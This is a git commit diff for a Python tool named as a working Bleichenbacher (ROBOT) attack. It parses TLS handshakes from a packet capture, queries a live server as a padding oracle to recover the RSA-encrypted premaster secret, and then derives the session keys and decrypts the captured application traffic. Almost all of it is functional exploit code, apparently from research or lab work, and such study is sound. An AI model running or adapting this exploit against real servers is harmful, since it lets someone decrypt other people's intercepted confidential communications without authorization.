7bfaedf74851cd7fb519292fe39a8b6c9da2f800
Jonathan Raes <jonathanraes@gmail.com>
2020-04-21 12:53:15 +0200

    working pcap decrypt attack

--- attack.py
+++ attack.py
@@ -2,13 +2,15 @@ from scapy.all import *
 import struct
 import binascii 
 import sys
-from robotattack import perform_decrypt_attack
+from robot_attack import perform_decrypt_attack
 import argparse
+from decrypt_aes import Decrypt
 load_layer("tls")
 
 client_random = None
 server_random = None
 enc_premaster_secret = None
+decrypt = None
 
 parser = argparse.ArgumentParser(description="Bleichenbacher attack")
 parser.add_argument("pcap", nargs="?", default="", help="Pcap file to read from")
@@ -26,36 +28,42 @@ def to_hex(bytes):
   return binascii.hexlify(bytearray(bytes))
 
 def process_packet(packet):
-  global client_random
-  global server_random
-  global enc_premaster_secret
-  # print(packet)
+  global client_random, server_random
+  global enc_premaster_secret, decrypt
   if (Raw in packet):
     raw = bytes(packet[Raw])
-    if(int(raw[0]) == 22): # handshake
-      if (int(raw[5]) == 1):
+
+    if(int(raw[0]) == 22):
+      handshake_type = int(raw[5])
+      if (handshake_type == 1):
         print("Found ClientHello")
-        client_random = raw[11:43]
-        print("client random: " + str(to_hex(client_random)))
-      elif (int(raw[5]) == 2):
+        client_random = int.from_bytes(raw[11:43], "big")
+        print("client random: ", hex(client_random))
+      elif (handshake_type == 2):
         print("Found ServerHello")
-        server_random = raw[11:43]
-        print("server random: " + str(to_hex(server_random)))
-      elif (int(raw[5]) == 16):
+        server_random = int.from_bytes(raw[11:43], "big")
+        print("server random: ", hex(server_random))
+      elif (handshake_type == 16):
         print("Found Client key exchange")
         length = int.from_bytes(raw[9:11], "big")
         enc_premaster_secret = raw[11:11+length]
         print("Encrypted premaster secret: " + str(to_hex(enc_premaster_secret)))
 
         dec_premaster_secret_data = perform_decrypt_attack(args.host, args.port, enc_premaster_secret, 5, False)
-        dec_premaster_secret = int.to_bytes(dec_premaster_secret_data, sys.getsizeof(dec_premaster_secret_data), "big")[-96:]
+        dec_premaster_secret = int.to_bytes(dec_premaster_secret_data, sys.getsizeof(dec_premaster_secret_data), "big")
         dec_premaster_secret = int.from_bytes(dec_premaster_secret, "big")
         print("Decrypted premaster secret: ", hex(dec_premaster_secret))
+        decrypt = Decrypt(hex(dec_premaster_secret), hex(client_random), hex(server_random))
     if(int(raw[0]) == 23): # application data
         print("Found application data")
         data_length = int.from_bytes(raw[3:5], "big")
         data = int.from_bytes(raw[5:5+data_length], "big")
-        print("Application data: " + hex(data))
+        print("Encrypted application data: " + hex(data))
+        if(packet[TCP].sport == 4000):
+          data = decrypt.decrypt_app_data("server", raw[5:5+data_length])
+        else:
+          data = decrypt.decrypt_app_data("client", raw[5:5+data_length])
+        print("Decrypted data:\n", data)
 
 if (args.pcap != ""):
   packets = rdpcap(args.pcap)
--- decrypt_aes.py
+++ decrypt_aes.py
@@ -29,8 +29,8 @@ example:
 class Decrypt:
     def __init__(self, pms_hex, client_r, server_r):
         self.pms = bytes.fromhex("000" + pms_hex[2:])[-48:]
-        self.client_random = bytes.fromhex(client_r)
-        self.server_random = bytes.fromhex(server_r)
+        self.client_random = bytes.fromhex(client_r[2:])
+        self.server_random = bytes.fromhex(server_r[2:])
         self.master_secret = ""
         self.client_write_key = ""
         self.server_write_key = ""
@@ -74,8 +74,9 @@ class Decrypt:
         self.client_write_iv = keys[104:120]
         self.server_write_iv = keys[120:136]
 
-    def decrypt_app_data(self, side, data):
-        app_data = bytes.fromhex(data)
+    def decrypt_app_data(self, side, app_data):
+        if type(app_data) is str:
+            app_data = bytes.fromhex(app_data)
         try:
             # side = client -> client to server. Decryption on the server side. So use client_write_key
             if side == "client":
@@ -87,16 +88,16 @@ class Decrypt:
                 pt_data = unpad(cipher.decrypt(app_data), 16)[:-self.mac_length]
 
         except Exception as e:
-            print(e)
-            exit(1)
+            print("Decryption failed: ", e)
+            return ""
 
         return pt_data[16:].decode('ascii', errors="ignore")
 
 
 # if __name__ == "__main__":
 #     a = "0x2f2d9ab7aa01e14c51a86d7e4e21e8141862d868e284baba8a45546a58356af14eff342ae748da0abc74373a0a80d19584b2ef879f036b5ff2b769a71047a442af01b8798aaba1e320ed123919cd20aadb2e17f6e4455618aa535744fe20ac684885134d9054495d7f78db1d67ec6f5330d2e8cd5bf0c56f879e951d1c0f3b8abc04aecb2cdf8d9cf7d64b45210b3629ef08ea6c421b079fa7ac03b937eda4d6afb6a0aecf5961ee108b49baa0feb6ab4f080de66daacf6abdefe9a83a3f76d0c61a8cadc1cba724855932f9a1000030342a50f8d874af5ea650a7f6469c98ae8c057c5adb0ce732e3aa9af153600fb7d33fb0d0ad34024be24b9913488b70303C3530D28A7172B3BADDB24EA5D605A9B7D2F05549F355DD85AEBA46288873CE178A87891B42383A84CFB3A9BEDC4"
-#     dec = Decrypt(a, "6844f918ef23051e59f00834e4f251a0675d0f831c26cb214a4c404214bad614",
-#                   "5e999839c5fc1f0726046b43a1f2c8ee23c0ac2ab95769a085f4ad2235a30206")
+#     dec = Decrypt(a, "0x6844f918ef23051e59f00834e4f251a0675d0f831c26cb214a4c404214bad614",
+#                   "0x5e999839c5fc1f0726046b43a1f2c8ee23c0ac2ab95769a085f4ad2235a30206")
 #     app_data = "164b7a67414ae1b710db98fc36cfc3abe2b1f961fe03b575888abe093c9065b25c816ad2c2369f86d15ed0cfce48710f7e9f6d792c884a37d091458e3014636cb0c1500d82cbf625bb83ef9c7f75d8c28a6dbe495fde9d53e84a53afd470231252e67ff7d38650902ad267fac6af7e82dd6fb6f766b9581ba3fb4bc30692541d507c6aebfffe19591e8e056490c91fcb01f910b6f21057909e9cb6ef0b5c687b354701c7607cf64fb03ded89411cb0a179ff8654fbaab507cc6ea76610a80ec63ba5525d8a9843c65f0a63d35219a04d9f5ac6900bd626b70d4ca0db9685af1a43cf4d9f3d006788bb359477ddfbb906da25e9c142f126cdf0da857462693528f9c171eeb7612f48085dcc030d271b769678fe6c4823ae547a18c14a3162a9ac0489a303c46597d6eb558757c74e96be58b49271c44a79c6e41e9243aee3027b"
 #     dec_data = dec.decrypt_app_data("server", app_data)
 #     print(dec_data)
